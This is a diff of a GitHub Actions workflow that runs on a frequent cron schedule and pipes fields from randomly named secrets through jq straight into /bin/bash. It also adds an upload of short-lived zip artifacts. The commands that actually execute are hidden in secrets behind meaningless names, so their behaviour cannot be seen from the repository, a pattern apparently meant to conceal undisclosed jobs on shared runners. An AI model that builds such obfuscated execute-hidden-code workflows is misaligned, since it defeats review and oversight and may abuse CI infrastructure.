@@ -1,8 +1,9 @@
 name: lingrenjianxue
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '16 4/6 * * *'
+    - cron: '41 4,10,16,22 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,20 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: lingrenjianxue
         env:
-          b2605: ${{ secrets.b2605 }}
+          eksb22630: ${{ secrets.eksb22630 }}
         run: |
-          echo $b2605 | jq -r .duje9 | /bin/bash
-          echo $yytr03 | jq -r .thted05 | /bin/bash
-          echo $v81 | jq -r .rtvna795 | /bin/bash
-          echo $fb1282 | jq -r .wk31497 | /bin/bash
-          echo $qz733 | jq -r .e7 | /bin/bash
-          echo $tblo59749 | jq -r .b64 | /bin/bash
-          echo $oyafo15157 | jq -r .c8 | /bin/bash
-          echo $bhfx99317 | jq -r .beguv98 | /bin/bash
-          echo $nuyx5 | jq -r .tyts483 | /bin/bash
-          echo $hiv26 | jq -r .upmw87 | /bin/bash
-          echo $a7 | jq -r .tkajd28094 | /bin/bash
-          echo $ujs641 | jq -r .zupdm46887 | /bin/bash
-          echo $hu97 | jq -r .dtan20417 | /bin/bash
-          echo $q5887 | jq -r .s2246 | /bin/bash
+          printf '%s' "$eksb22630" | jq -r .gtal27 | /bin/bash
+          printf '%s' "$b30878" | jq -r .hegvt5506 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: IObpcGrp
+          path: "*.zip"
+          retention-days: 1
